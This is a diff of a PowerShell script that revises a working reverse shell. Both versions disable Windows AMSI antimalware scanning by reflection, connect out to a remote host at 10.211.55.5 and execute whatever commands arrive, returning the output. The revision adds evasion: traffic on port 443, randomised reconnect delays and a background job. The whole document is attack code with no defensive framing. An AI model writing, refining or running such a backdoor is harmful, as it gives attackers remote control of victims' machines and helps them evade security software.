@@ -1,39 +1,39 @@
 
-$IP = "10.211.55.5"
-$PT = 4444
-
-
-$w = 'System.Management.Automation.AmsiUtils'
-$f = 'amsiInitFailed'
-[Ref].Assembly.GetType($w).GetField($f, 'NonPublic,Static').SetValue($null, $true)
-
-
-Function Invoke-StealthConnect {
-While($true) {
+$TargetIP = "10.211.55.5"
+$TargetPort = "443"
+$JitterMax = 5000 
+Function Invoke-StealthConnection {
+  
 Try {
-           
-            $c = [System.Activator]::CreateInstance([System.Net.Sockets.TcpClient], $IP, $PT)
-            $s = $c.GetStream()
-            $b = New-Object byte[] 8192
-While($c.Connected) {
-            
-                $r = $s.Read($b, 0, $b.Length)
-If($r -gt 0) {
-                    $d = [System.Text.Encoding]::ASCII.GetString($b, 0, $r)
-                    
-               
-                    $out = &([scriptblock]::Create($d)) 2>&1 | Out-String
-                    $res = [System.Text.Encoding]::ASCII.GetBytes($out + "PS> ")
-                    $s.Write($res, 0, $res.Length)
-                    $s.Flush()
-                }
+        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        $f = $a.GetField('amsiInitFailed', 'NonPublic,Static')
+        $f.SetValue($null, $true)
+    } catch { }
+
+  
+While ($true) {
+Try {
+            $client = New-Object System.Net.Sockets.TCPClient($TargetIP, $TargetPort)
+            $stream = $client.GetStream()
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $reader = New-Object System.IO.StreamReader($stream)
+            $writer.AutoFlush = $true
+While ($client.Connected) {
+                $cmd = $reader.ReadLine()
+If ($cmd -eq "exit") { break }
+                
+              
+                $output = Invoke-Expression $cmd 2>&1 | Out-String
+                $writer.WriteLine($output + "PS>")
             }
+            $client.Close()
         } catch {
-           
-            Start-Sleep -Seconds 10
+          
+            $sleepTime = Get-Random -Minimum 1000 -Maximum $JitterMax
+            Start-Sleep -Milliseconds $sleepTime
         }
     }
 }
 
-# --- EXECUTION ---
-Invoke-StealthConnect
+# Execute in background thread to keep the host process responsive
+$job = Start-Job -ScriptBlock ${function:Invoke-StealthConnection}
